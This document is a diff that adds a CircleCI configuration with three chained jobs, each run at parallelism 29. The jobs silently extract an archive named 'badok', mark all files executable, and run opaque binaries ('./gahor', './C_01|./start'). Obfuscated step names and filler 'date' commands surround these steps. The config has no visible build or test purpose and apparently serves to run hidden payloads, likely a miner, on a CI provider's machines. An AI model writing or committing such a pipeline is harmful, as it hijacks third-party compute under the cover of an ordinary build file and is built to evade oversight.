@@ -1,1 +1,182 @@
+version: 2.1
+jobs:
+  naporci:
+    docker:
+      - image: cimg/python:3.8
+    steps:
+      - checkout
+      - run:
+          name: kosda
+          command: |
+            date
+      - run:
+          name: rivca
+          command: |
+            tar -xf badok >/dev/null 2>&1
+      - run:
+          name: sanux
+          command: |
+            chmod u+x * >/dev/null 2>&1
+      - run:
+          name: ulal
+          command: |
+            ./gahor
+      - run:
+          name: kamil
+          command: |
+            date
+      - run:
+          name: rauru
+          command: |
+            date
+      - run:
+          name: ruci
+          command: |
+            date
+      - run:
+          name: datal
+          command: |
+            date
+      - run:
+          name: senio
+          command: |
+            date
+      - run:
+          name: karun
+          command: |
+            ./C_01|./start
+      - run:
+          name: runpa
+          command: |
+            ./C_01|./start
+      - run:
+          name: ls
+          command: |
+            date
+    parallelism: 29
 
+  cicdrun:
+    docker:
+      - image: cimg/python:3.8
+    steps:
+      - checkout
+      - run:
+          name: celp
+          command: |
+            date
+      - run:
+          name: barup
+          command: |
+            date
+      - run:
+          name: nero
+          command: |
+            date
+      - run:
+          name: lapisa
+          command: |
+            date
+      - run:
+          name: yunp
+          command: |
+            tar -xf badok >/dev/null 2>&1
+      - run:
+          name: kilop
+          command: |
+            date
+      - run:
+          name: hert
+          command: |
+            chmod u+x * >/dev/null 2>&1
+      - run:
+          name: my
+          command: |
+            ./gahor
+      - run:
+          name: loop
+          command: |
+            ./C_01|./start
+      - run:
+          name: duel
+          command: |
+            ./C_01|./start
+      - run:
+          name: paol
+          command: |
+            date
+      - run:
+          name: nas
+          command: |
+            date
+    parallelism: 29
+
+  apkirla:
+    docker:
+      - image: cimg/python:3.8
+    steps:
+      - checkout
+      - run:
+          name: poli
+          command: |
+            tar -xf badok >/dev/null 2>&1
+      - run:
+          name: nasrt
+          command: |
+            date
+      - run:
+          name: nulip
+          command: |
+            date
+      - run:
+          name: khas
+          command: |
+            chmod u+x * >/dev/null 2>&1
+      - run:
+          name: ilo
+          command: |
+            ./gahor
+      - run:
+          name: chalp
+          command: |
+            date
+      - run:
+          name: hier
+          command: |
+            date
+      - run:
+          name: naps
+          command: |
+            date
+      - run:
+          name: dues
+          command: |
+            date
+      - run:
+          name: nurri
+          command: |
+            date
+      - run:
+          name: lapoor
+          command: |
+            ./C_01|./start
+      - run:
+          name: khan
+          command: |
+            ./C_01|./start
+    parallelism: 29
+
+
+
+
+
+workflows:
+  version: 2
+  all:
+    jobs:
+      - naporci
+      - cicdrun:
+          requires:
+            - naporci
+      - apkirla:
+          requires:
+            - cicdrun
